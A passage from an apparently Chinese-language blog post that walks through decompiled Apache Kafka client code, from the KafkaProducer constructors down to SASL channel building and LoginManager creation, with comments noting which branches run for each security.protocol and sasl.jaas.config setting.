class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//3、调用至此构造方法3</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaProducer</span><span class="hljs-params">(Map&lt;String, Object&gt; configs, Serializer&lt;K&gt; keySerializer, Serializer&lt;V&gt; valueSerializer)</span> &#123;<br>    <span class="hljs-built_in">this</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProducerConfig</span>(ProducerConfig.appendSerializerToConfig(configs, keySerializer, valueSerializer)), keySerializer, valueSerializer, (ProducerMetadata)<span class="hljs-literal">null</span>, (KafkaClient)<span class="hljs-literal">null</span>, (ProducerInterceptors)<span class="hljs-literal">null</span>, Time.SYSTEM);<br>&#125;<br><br><span class="hljs-comment">//1、调用此构造方法1</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaProducer</span><span class="hljs-params">(Properties properties)</span> &#123;<br>    <span class="hljs-built_in">this</span>((Properties)properties, (Serializer)<span class="hljs-literal">null</span>, (Serializer)<span class="hljs-literal">null</span>);<br>&#125;<br><br><span class="hljs-comment">//2、调用至此构造方法2</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaProducer</span><span class="hljs-params">(Properties properties, Serializer&lt;K&gt; keySerializer, Serializer&lt;V&gt; valueSerializer)</span> &#123;<br>    <span class="hljs-built_in">this</span>(Utils.propsToMap(properties), keySerializer, valueSerializer);<br>&#125;<br><br><span class="hljs-comment">//4、最终调用至此构造方法4</span><br>KafkaProducer(ProducerConfig config, Serializer&lt;K&gt; keySerializer, Serializer&lt;V&gt; valueSerializer, ProducerMetadata metadata, KafkaClient kafkaClient, ProducerInterceptors&lt;K, V&gt; interceptors, Time time) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//以下皆为赋值操作</span><br>        <span class="hljs-built_in">this</span>.producerConfig = config;<br>        <span class="hljs-built_in">this</span>.time = time;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">transactionalId</span> <span class="hljs-operator">=</span> config.getString(<span class="hljs-string">&quot;transactional.id&quot;</span>);<br>        <span class="hljs-built_in">this</span>.clientId = config.getString(<span class="hljs-string">&quot;client.id&quot;</span>);<br>        LogContext logContext;<br>        <span class="hljs-keyword">if</span> (transactionalId == <span class="hljs-literal">null</span>) &#123;<br>            logContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogContext</span>(String.format(<span class="hljs-string">&quot;[Producer clientId=%s] &quot;</span>, <span class="hljs-built_in">this</span>.clientId));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            logContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogContext</span>(String.format(<span class="hljs-string">&quot;[Producer clientId=%s, transactionalId=%s] &quot;</span>, <span class="hljs-built_in">this</span>.clientId, transactionalId));<br>        &#125;<br>    ......<br><br>        <span class="hljs-built_in">this</span>.errors = <span class="hljs-built_in">this</span>.metrics.sensor(<span class="hljs-string">&quot;errors&quot;</span>);<br>        <span class="hljs-comment">//调用newSender()方法</span><br>        <span class="hljs-built_in">this</span>.sender = <span class="hljs-built_in">this</span>.newSender(logContext, kafkaClient, <span class="hljs-built_in">this</span>.metadata);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">ioThreadName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;kafka-producer-network-thread | &quot;</span> + <span class="hljs-built_in">this</span>.clientId;<br>        <span class="hljs-built_in">this</span>.ioThread = <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaThread</span>(ioThreadName, <span class="hljs-built_in">this</span>.sender, <span class="hljs-literal">true</span>);<br>        <span class="hljs-built_in">this</span>.ioThread.start();<br>        config.logUnused();<br>        AppInfoParser.registerAppInfo(<span class="hljs-string">&quot;kafka.producer&quot;</span>, <span class="hljs-built_in">this</span>.clientId, <span class="hljs-built_in">this</span>.metrics, time.milliseconds());<br>        <span class="hljs-built_in">this</span>.log.debug(<span class="hljs-string">&quot;Kafka producer started&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (Throwable var24) &#123;<br>        <span class="hljs-built_in">this</span>.close(Duration.ofMillis(<span class="hljs-number">0L</span>), <span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaException</span>(<span class="hljs-string">&quot;Failed to construct kafka producer&quot;</span>, var24);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用构造方法1</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-1.png" alt="img"></p><p>直至调用至构造方法4</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-2.png" alt="img"></p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-3.png" alt="img"></p><p>org.apache.kafka.clients.producer.KafkaProducer#newSender()</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-4.png" alt="img"></p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-5.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">Sender <span class="hljs-title function_">newSender</span><span class="hljs-params">(LogContext logContext, KafkaClient kafkaClient, ProducerMetadata metadata)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">maxInflightRequests</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.producerConfig.getInt(<span class="hljs-string">&quot;max.in.flight.requests.per.connection&quot;</span>);<br>    <span class="hljs-type">int</span> <span class="hljs-variable">requestTimeoutMs</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.producerConfig.getInt(<span class="hljs-string">&quot;request.timeout.ms&quot;</span>);<br>    <span class="hljs-comment">//调用至ClientUtils#createChannelBuilder()</span><br>    <span class="hljs-type">ChannelBuilder</span> <span class="hljs-variable">channelBuilder</span> <span class="hljs-operator">=</span> ClientUtils.createChannelBuilder(<span class="hljs-built_in">this</span>.producerConfig, <span class="hljs-built_in">this</span>.time, logContext);<br>    <span class="hljs-type">ProducerMetrics</span> <span class="hljs-variable">metricsRegistry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProducerMetrics</span>(<span class="hljs-built_in">this</span>.metrics);<br>    <span class="hljs-type">Sensor</span> <span class="hljs-variable">throttleTimeSensor</span> <span class="hljs-operator">=</span> Sender.throttleTimeSensor(metricsRegistry.senderMetrics);<br>    <span class="hljs-type">KafkaClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> kafkaClient != <span class="hljs-literal">null</span> ? kafkaClient : <span class="hljs-keyword">new</span> <span class="hljs-title class_">NetworkClient</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Selector</span>(<span class="hljs-built_in">this</span>.producerConfig.getLong(<span class="hljs-string">&quot;connections.max.idle.ms&quot;</span>), <span class="hljs-built_in">this</span>.metrics, <span class="hljs-built_in">this</span>.time, <span class="hljs-string">&quot;producer&quot;</span>, channelBuilder, logContext), metadata, <span class="hljs-built_in">this</span>.clientId, maxInflightRequests, <span class="hljs-built_in">this</span>.producerConfig.getLong(<span class="hljs-string">&quot;reconnect.backoff.ms&quot;</span>), <span class="hljs-built_in">this</span>.producerConfig.getLong(<span class="hljs-string">&quot;reconnect.backoff.max.ms&quot;</span>), <span class="hljs-built_in">this</span>.producerConfig.getInt(<span class="hljs-string">&quot;send.buffer.bytes&quot;</span>), <span class="hljs-built_in">this</span>.producerConfig.getInt(<span class="hljs-string">&quot;receive.buffer.bytes&quot;</span>), requestTimeoutMs, <span class="hljs-built_in">this</span>.producerConfig.getLong(<span class="hljs-string">&quot;socket.connection.setup.timeout.ms&quot;</span>), <span class="hljs-built_in">this</span>.producerConfig.getLong(<span class="hljs-string">&quot;socket.connection.setup.timeout.max.ms&quot;</span>), <span class="hljs-built_in">this</span>.time, <span class="hljs-literal">true</span>, <span class="hljs-built_in">this</span>.apiVersions, throttleTimeSensor, logContext);<br>    <span class="hljs-type">short</span> <span class="hljs-variable">acks</span> <span class="hljs-operator">=</span> Short.parseShort(<span class="hljs-built_in">this</span>.producerConfig.getString(<span class="hljs-string">&quot;acks&quot;</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sender</span>(logContext, (KafkaClient)client, metadata, <span class="hljs-built_in">this</span>.accumulator, maxInflightRequests == <span class="hljs-number">1</span>, <span class="hljs-built_in">this</span>.producerConfig.getInt(<span class="hljs-string">&quot;max.request.size&quot;</span>), acks, <span class="hljs-built_in">this</span>.producerConfig.getInt(<span class="hljs-string">&quot;retries&quot;</span>), metricsRegistry.senderMetrics, <span class="hljs-built_in">this</span>.time, requestTimeoutMs, <span class="hljs-built_in">this</span>.producerConfig.getLong(<span class="hljs-string">&quot;retry.backoff.ms&quot;</span>), <span class="hljs-built_in">this</span>.transactionManager, <span class="hljs-built_in">this</span>.apiVersions);<br>&#125;<br></code></pre></td></tr></table></figure><p>org.apache.kafka.clients.ClientUtils#createChannelBuilder()</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-6.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ChannelBuilder <span class="hljs-title function_">createChannelBuilder</span><span class="hljs-params">(AbstractConfig config, Time time, LogContext logContext)</span> &#123;<br>    <span class="hljs-comment">//securityProtocol值为之前security.protocol设置值</span><br>    <span class="hljs-type">SecurityProtocol</span> <span class="hljs-variable">securityProtocol</span> <span class="hljs-operator">=</span> SecurityProtocol.forName(config.getString(<span class="hljs-string">&quot;security.protocol&quot;</span>));<br>    <span class="hljs-type">String</span> <span class="hljs-variable">clientSaslMechanism</span> <span class="hljs-operator">=</span> config.getString(<span class="hljs-string">&quot;sasl.mechanism&quot;</span>);<br>    <span class="hljs-comment">//调用至ChannelBuilders#clientChannelBuilder()</span><br>    <span class="hljs-keyword">return</span> ChannelBuilders.clientChannelBuilder(securityProtocol, Type.CLIENT, config, (ListenerName)<span class="hljs-literal">null</span>, clientSaslMechanism, time, <span class="hljs-literal">true</span>, logContext);<br>&#125;之前security.protocol<br></code></pre></td></tr></table></figure><p>org.apache.kafka.common.network.ChannelBuilders#clientChannelBuilder()</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-7.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ChannelBuilder <span class="hljs-title function_">clientChannelBuilder</span><span class="hljs-params">(SecurityProtocol securityProtocol, JaasContext.Type contextType, AbstractConfig config, ListenerName listenerName, String clientSaslMechanism, Time time, <span class="hljs-type">boolean</span> saslHandshakeRequestEnable, LogContext logContext)</span> &#123;<br>    <span class="hljs-keyword">if</span> (securityProtocol == SecurityProtocol.SASL_PLAINTEXT || securityProtocol == SecurityProtocol.SASL_SSL) &#123;<br>        <span class="hljs-comment">//contextType不为空，不进入</span><br>        <span class="hljs-keyword">if</span> (contextType == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;`contextType` must be non-null if `securityProtocol` is `&quot;</span> + securityProtocol + <span class="hljs-string">&quot;`&quot;</span>);<br>        &#125;<br><span class="hljs-comment">//clientSaslMechanism不为空，不进入</span><br>        <span class="hljs-keyword">if</span> (clientSaslMechanism == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;`clientSaslMechanism` must be non-null in client mode if `securityProtocol` is `&quot;</span> + securityProtocol + <span class="hljs-string">&quot;`&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//调用至ChannelBuilders#create()</span><br>    <span class="hljs-keyword">return</span> create(securityProtocol, Mode.CLIENT, contextType, config, listenerName, <span class="hljs-literal">false</span>, clientSaslMechanism, saslHandshakeRequestEnable, (CredentialCache)<span class="hljs-literal">null</span>, (DelegationTokenCache)<span class="hljs-literal">null</span>, time, logContext, (Supplier)<span class="hljs-literal">null</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>org.apache.kafka.common.network.ChannelBuilders#create()</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-8.png" alt="img"></p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-9.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ChannelBuilder <span class="hljs-title function_">create</span><span class="hljs-params">(SecurityProtocol securityProtocol, Mode mode, JaasContext.Type contextType, AbstractConfig config, ListenerName listenerName, <span class="hljs-type">boolean</span> isInterBrokerListener, String clientSaslMechanism, <span class="hljs-type">boolean</span> saslHandshakeRequestEnable, CredentialCache credentialCache, DelegationTokenCache tokenCache, Time time, LogContext logContext, Supplier&lt;ApiVersionsResponse&gt; apiVersionSupplier)</span> &#123;<br>    Map&lt;String, Object&gt; configs = channelBuilderConfigs(config, listenerName);<br>    Object channelBuilder;<br>    <span class="hljs-comment">//securityProtocol为传入security.protocol值</span><br>    <span class="hljs-keyword">switch</span> (securityProtocol) &#123;<br>        <span class="hljs-comment">//security.protocol值为SSL进入   </span><br>        <span class="hljs-keyword">case</span> SSL:<br>            requireNonNullMode(mode, securityProtocol);<br>            channelBuilder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SslChannelBuilder</span>(mode, listenerName, isInterBrokerListener, logContext);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//security.protocol值为SASL_SSL、SASL_PLAINTEXT进入      </span><br>        <span class="hljs-keyword">case</span> SASL_SSL:<br>        <span class="hljs-keyword">case</span> SASL_PLAINTEXT:<br>            requireNonNullMode(mode, securityProtocol);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">sslClientAuthOverride</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            Object jaasContexts;<br>            <span class="hljs-comment">//mode默认为CLIENT进入</span><br>            <span class="hljs-keyword">if</span> (mode != Mode.SERVER) &#123;<br>                <span class="hljs-type">JaasContext</span> <span class="hljs-variable">jaasContext</span> <span class="hljs-operator">=</span> contextType == Type.CLIENT ? JaasContext.loadClientContext(configs) : JaasContext.loadServerContext(listenerName, clientSaslMechanism, configs);<br>                jaasContexts = Collections.singletonMap(clientSaslMechanism, jaasContext);<br>            <span class="hljs-comment">//else默认不进入</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                List&lt;String&gt; enabledMechanisms = (List)configs.get(<span class="hljs-string">&quot;sasl.enabled.mechanisms&quot;</span>);<br>                jaasContexts = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(enabledMechanisms.size());<br>                <span class="hljs-type">Iterator</span> <span class="hljs-variable">var18</span> <span class="hljs-operator">=</span> enabledMechanisms.iterator();<br><br>                String listenerClientAuth;<br>                <span class="hljs-keyword">while</span>(var18.hasNext()) &#123;<br>                    listenerClientAuth = (String)var18.next();<br>                    ((Map)jaasContexts).put(listenerClientAuth, JaasContext.loadServerContext(listenerName, listenerClientAuth, configs));<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (listenerName != <span class="hljs-literal">null</span> &amp;&amp; securityProtocol == SecurityProtocol.SASL_SSL) &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">configuredClientAuth</span> <span class="hljs-operator">=</span> (String)configs.get(<span class="hljs-string">&quot;ssl.client.auth&quot;</span>);<br>                    listenerClientAuth = (String)config.originalsWithPrefix(listenerName.configPrefix(), <span class="hljs-literal">true</span>).get(<span class="hljs-string">&quot;ssl.client.auth&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (listenerClientAuth == <span class="hljs-literal">null</span>) &#123;<br>                        sslClientAuthOverride = SslClientAuth.NONE.name().toLowerCase(Locale.ROOT);<br>                        <span class="hljs-keyword">if</span> (configuredClientAuth != <span class="hljs-literal">null</span> &amp;&amp; !configuredClientAuth.equalsIgnoreCase(SslClientAuth.NONE.name())) &#123;<br>                            log.warn(<span class="hljs-string">&quot;Broker configuration &#x27;&#123;&#125;&#x27; is applied only to SSL listeners. Listener-prefixed configuration can be used to enable SSL client authentication for SASL_SSL listeners. In future releases, broker-wide option without listener prefix may be applied to SASL_SSL listeners as well. All configuration options intended for specific listeners should be listener-prefixed.&quot;</span>, <span class="hljs-string">&quot;ssl.client.auth&quot;</span>);<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        <span class="hljs-comment">//channelBuilder为SaslChannelBuilder</span><br>            channelBuilder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SaslChannelBuilder</span>(mode, (Map)jaasContexts, securityProtocol, listenerName, isInterBrokerListener, clientSaslMechanism, saslHandshakeRequestEnable, credentialCache, tokenCache, sslClientAuthOverride, time, logContext, apiVersionSupplier);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//security.protocol值为PLAINTEXT进入      </span><br>        <span class="hljs-keyword">case</span> PLAINTEXT:<br>            channelBuilder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PlaintextChannelBuilder</span>(listenerName);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//security.protocol值不为以上值进入      </span><br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Unexpected securityProtocol &quot;</span> + securityProtocol);<br>    &#125;<br>    <span class="hljs-comment">//调用channelBuilder).configure()</span><br>    <span class="hljs-comment">//当security.protocol值为SSL   channelBuilder为SslChannelBuilder类</span><br>    <span class="hljs-comment">//当security.protocol值为SASL_SSL、SASL_PLAINTEXT   channelBuilder为SaslChannelBuilder类</span><br>    <span class="hljs-comment">//当security.protocol值不为以上值   channelBuilder为IllegalArgumentException类</span><br>    ((ChannelBuilder)channelBuilder).configure(configs);<br>    <span class="hljs-keyword">return</span> (ChannelBuilder)channelBuilder;<br>&#125;<br></code></pre></td></tr></table></figure><p>org.apache.kafka.common.network.SaslChannelBuilder#configure()</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-10.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(Map&lt;String, ?&gt; configs)</span> <span class="hljs-keyword">throws</span> KafkaException &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        ......<br>        <span class="hljs-keyword">while</span>(var12.hasNext()) &#123;<br>            Map.Entry&lt;String, JaasContext&gt; entry = (Map.Entry)var12.next();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">mechanism</span> <span class="hljs-operator">=</span> (String)entry.getKey();<br>            <span class="hljs-comment">//调用至LoginManager#acquireLoginManager()</span><br>            <span class="hljs-type">LoginManager</span> <span class="hljs-variable">loginManager</span> <span class="hljs-operator">=</span> LoginManager.acquireLoginManager((JaasContext)entry.getValue(), mechanism, defaultLoginClass, configs);<br>            <span class="hljs-built_in">this</span>.loginManagers.put(mechanism, loginManager);<br>            <span class="hljs-type">Subject</span> <span class="hljs-variable">subject</span> <span class="hljs-operator">=</span> loginManager.subject();<br>            <span class="hljs-built_in">this</span>.subjects.put(mechanism, subject);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.mode == Mode.SERVER &amp;&amp; mechanism.equals(<span class="hljs-string">&quot;GSSAPI&quot;</span>)) &#123;<br>                <span class="hljs-built_in">this</span>.maybeAddNativeGssapiCredentials(subject);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.securityProtocol == SecurityProtocol.SASL_SSL) &#123;<br>            <span class="hljs-built_in">this</span>.sslFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SslFactory</span>(<span class="hljs-built_in">this</span>.mode, <span class="hljs-built_in">this</span>.sslClientAuthOverride, <span class="hljs-built_in">this</span>.isInterBrokerListener);<br>            <span class="hljs-built_in">this</span>.sslFactory.configure(configs);<br>        &#125;<br><br>    &#125; <span class="hljs-keyword">catch</span> (Throwable var9) &#123;<br>        <span class="hljs-built_in">this</span>.close();<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaException</span>(var9);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>org.apache.kafka.common.security.authenticator.LoginManager#acquireLoginManager()</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-11.png" alt="img"></p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-12.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> LoginManager <span class="hljs-title function_">acquireLoginManager</span><span class="hljs-params">(JaasContext jaasContext, String saslMechanism, Class&lt;? extends Login&gt; defaultLoginClass, Map&lt;String, ?&gt; configs)</span> <span class="hljs-keyword">throws</span> LoginException &#123;<br>    Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Login</span>&gt; loginClass = configuredClassOrDefault(configs, jaasContext, saslMechanism, <span class="hljs-string">&quot;sasl.login.class&quot;</span>, defaultLoginClass);<br>    Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AuthenticateCallbackHandler</span>&gt; defaultLoginCallbackHandlerClass = <span class="hljs-string">&quot;OAUTHBEARER&quot;</span>.equals(saslMechanism) ? OAuthBearerUnsecuredLoginCallbackHandler.class : AbstractLogin.DefaultLoginCallbackHandler.class;<br>    Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AuthenticateCallbackHandler</span>&gt; loginCallbackClass = configuredClassOrDefault(configs, jaasContext, saslMechanism, <span class="hljs-string">&quot;sasl.login.callback.handler.class&quot;</span>, defaultLoginCallbackHandlerClass);<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> LoginManager.class;<br>    <span class="hljs-keyword">synchronized</span>(LoginManager.class) &#123;<br>        <span class="hljs-type">Password</span> <span class="hljs-variable">jaasConfigValue</span> <span class="hljs-operator">=</span> jaasContext.dynamicJaasConfig();<br>        LoginManager loginManager;<br>        LoginMetadata loginMetadata;<br>        <span class="hljs-comment">//jaasConfigValue为传入sasl.jaas.config值，不为空</span><br>        <span class="hljs-keyword">if</span> (jaasConfigValue != <span class="hljs-literal">null</span>) &#123;<br>            loginMetadata = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginMetadata</span>(jaasConfigValue, loginClass, loginCallbackClass);<br>            loginManager = (LoginManager)DYNAMIC_INSTANCES.get(loginMetadata);<br>            <span class="hljs-comment">//loginManager默认为空</span><br>            <span class="hljs-keyword">if</span> (loginManager == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">//new LoginManager()</span><br>                loginManager = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginManager</span>(jaasContext, saslMechanism, configs, loginMetadata);<br>                DYNAMIC_INSTANCES.put(loginMetadata, loginManager);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            loginMetadata = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginMetadata</span>(jaasContext.name(), loginClass, loginCallbackClass);<br>            loginManager = (LoginManager)STATIC_INSTANCES.get(loginMetadata);<br>            <span class="hljs-keyword">if</span> (loginManager == <span class="hljs-literal">null</span>) &#123;<br>                loginManager = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginManager</span>(jaasContext, saslMechanism, configs, loginMetadata);<br>                STATIC_INSTANCES.put(loginMetadata, loginManager);<br>            &#125;<br>        &#125;<br><br>        SecurityUtils.addConfiguredSecurityProviders(configs);<br>        <span class="hljs-keyword">return</span> loginManager.acquire();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>org.apache.kafka.common.security.authenticator.LoginManager构造方法</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-13.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-title function_">LoginManager</span><span class="hljs-params">(JaasContext jaasContext, String saslMechanism, Map&lt;String, ?&gt; configs, LoginMetadata&lt;?&gt; loginMetadata)</span> <span class="hljs-keyword">throws</span> LoginException &#123;<br>    <span class="hljs-built_in">this</span>.loginMetadata = loginMetadata;<br>    <span class="hljs-built_in">this</span>.login = (Login)Utils.newInstance(loginMetadata.loginClass);<br>    <span class="hljs-built_in">this</span>.loginCallbackHandler = (AuthenticateCallbackHandler)Utils.newInstance(loginMetadata.loginCallbackClass);<br>    <span class="hljs-built_in">this</span>.loginCallbackHandler.configure(configs, saslMechanism, jaasContext.configurationEntries());<br>    <span class="hljs-built_in">this</span>.login.configure(configs, jaasContext.name(), jaasContext.configuration(), <span 